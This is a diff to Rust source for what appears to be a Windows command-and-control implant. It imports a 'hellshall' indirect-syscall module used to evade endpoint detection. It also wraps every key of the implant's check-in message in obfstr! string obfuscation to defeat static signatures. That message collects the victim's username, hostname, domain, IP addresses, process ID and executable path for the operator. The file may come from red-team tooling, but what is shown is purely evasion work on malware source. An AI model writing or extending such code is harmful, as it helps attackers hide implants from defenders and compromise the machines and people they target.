@@ -1,3 +1,4 @@
+use obfstr::obfstr;
 use crate::config;
 use crate::transport;
 use crate::hellshall::{NtSyscall, RunSyscall, SetSSn, fetch_nt_syscall,crc32h};
@@ -203,18 +204,18 @@ pub fn checkin() {
         .unwrap_or_default();
 
     let checkin_data = serde_json::json!({
-        "action": "checkin",
-        "uuid": *config::UUID,
-        "os": "windows",
-        "user": username,
-        "host": hostname,
-        "pid": get_pid_via_syscall(),
-        "architecture": "x64",
-        "domain": std::env::var("USERDOMAIN").unwrap_or_default(),
-        "ips": ips,
-        "integrity_level": 2,
-        "external_ip": "",
-        "process_name": std::env::current_exe()
+        obfstr!("action"): obfstr!("checkin"),
+        obfstr!("uuid"): *config::UUID,
+        obfstr!("os"): "windows",
+        obfstr!("user"): username,
+        obfstr!("host"): hostname,
+        obfstr!("pid"): get_pid_via_syscall(),
+        obfstr!("architecture"): "x64",
+        obfstr!("domain"): std::env::var("USERDOMAIN").unwrap_or_default(),
+        obfstr!("ips"): ips,
+        obfstr!("integrity_level"): 2,
+        obfstr!("external_ip"): "",
+        obfstr!("process_name"): std::env::current_exe()
             .map(|p| p.to_string_lossy().to_string())
             .unwrap_or_default(),
     });
